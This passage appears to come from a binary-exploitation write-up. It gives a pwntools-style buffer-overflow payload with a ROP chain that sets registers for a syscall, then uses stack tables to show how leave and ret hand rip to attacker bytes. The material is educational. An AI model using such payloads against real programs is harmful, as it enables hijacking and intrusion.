```python
payload = b'A'*32 + b'B'*8 + b'C'*8 + b'D'*16
payload = flat(
	b'A'*32,
	b'B'*8,
	p64(pop_rdi),
	p64(0x59),
	p64(xor_rax_rdi),
	p64(pop_rdi),
	p64(first_input),
	p64(pop_rsi),
	p64(0x0),
	p64(pop_rdx),
	p64(0x0),
	p64(syscall),
)
```
|register|address|value|ascii
|-|-|-|-|
|rsp|0xfe158|0x4010e0
|rsi|0xfe160|input_hex (0x4141414141414141)|AAAAAAAA
||0xfe168|input + 8|AAAAAAAA|
||0xfe170|input + 16|AAAAAAAA
||0xfe178|input + 24|AAAAAAAA
|rbp|0xfe180|input + 32 (0x4242424242424242)|BBBBBBBB 
|ret_addr|0xfe188|input + 40 (0x4343434343434343)|CCCCCCCC
||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
<br>Calling the return will do the following
- `mov rsp,rbp`, delete the last frame

|register|address|value|ascii
|-|-|-|-|
|rsp,rbp|0xfe180|input + 32 (0x4242424242424242)|BBBBBBBB 
|ret_addr|0xfe188|input + 40 (0x4343434343434343)|CCCCCCCC
||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
<br>

- `pop rbp`, pop from the stack to `rbp` and move  `rsp` to the next address

|register|address|value|ascii
|-|-|-|-|
|rsp (ret_addr)|0xfe188|input + 40 (0x4343434343434343)|CCCCCCCC
||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
|rbp|0x4242424242424242|
<br>

- `ret`, set `rip` to the value of `rsp` and move `rsp` to the next address

|register|address|value|ascii
|-|-|-|-|
|rsp|0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
|rbp|0x4242424242424242|
`rip` = `0x4343434343434343`
